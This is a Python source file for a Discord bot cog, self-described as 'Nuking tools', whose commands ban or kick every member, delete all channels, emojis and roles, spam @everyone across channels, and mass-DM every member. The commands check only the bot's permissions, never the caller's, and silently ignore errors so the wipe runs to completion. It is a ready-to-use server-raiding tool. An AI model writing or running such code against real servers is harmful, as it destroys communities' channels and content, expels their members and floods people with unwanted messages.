from __future__ import annotations

from core import Ritik, Context, Cog
from discord.ext import commands

class Nukes(Cog):
    """Nuking tools. Stay away"""
    def __init__(self, bot: Ritik):
        self.bot = bot

    @commands.command(name='banall')
    @commands.bot_has_permissions(ban_members=True)
    async def banall(self, ctx: Context, *, reason: str = None):
        """To Ban all the members from the guild"""
        for member in ctx.guild.members:
            try:
                await member.ban(reason=f'{reason if reason else "RitikX OP"}')
            except Exception:
                pass

    @commands.command(name='kickall')
    @commands.bot_has_permissions(kick_members=True)
    async def kickall(self, ctx: Context, *, reason: str = None):
        """To kick all the member from the guild"""
        for member in ctx.guild.members:
            try:
                await member.kick(reason=f'{reason if reason else "RitikX OP"}'
                                  )
            except Exception:
                pass

    @commands.command(name='delemoji')
    @commands.bot_has_permissions(manage_emojis=True)
    async def delemoji(self, ctx: Context, *, reason: str = None):
        """To delete all the emoji of the server"""
        for emoji in ctx.guild.emojis:
            try:
                await emoji.delete(
                    reason=f'{reason if reason else "RitikX OP"}')
            except Exception:
                pass

    @commands.command(name='delchannel')
    @commands.bot_has_permissions(manage_channels=True)
    async def delchannel(self, ctx: Context, *, reason: str = None):
        """To delete all the channel of the server"""
        for channel in ctx.guild.channels:
            try:
                await channel.delete(
                    reason=f'{reason if reason else "RitikX OP"}')
            except Exception:
                pass

    @commands.command(name='spameveryone', aliases=['everyone'])
    @commands.bot_has_permissions(mention_everyone=True)
    async def everyone(self, ctx: Context):
        """To spam @everyone in all possible channels"""
        for channel in ctx.guild.channels:
            try:
                await channel.send(f"@everyone")
            except Exception:
                pass

    @commands.command(name='massdm')
    async def massdm(self, ctx: Context, *, text: str):
      """To Mass DM every user, if possible"""
      for member in ctx.guild.members:
          try:
              await member.send(f"{text[:1990:]}")
          except Exception:
              pass
    @commands.command(name='roledelete')
    @commands.bot_has_permissions(manage_roles=True)
    async def deleteroles(self, ctx: Context, *, reason: str):
        """To delete all the roles from the server"""
        for roles in ctx.guild.roles:
            try:
                await roles.delete(reason=f'{reason if reason else "RitikX OP"}')
            except Exception:
                pass

def setup(bot: Ritik):
    bot.add_cog(Nukes(bot))
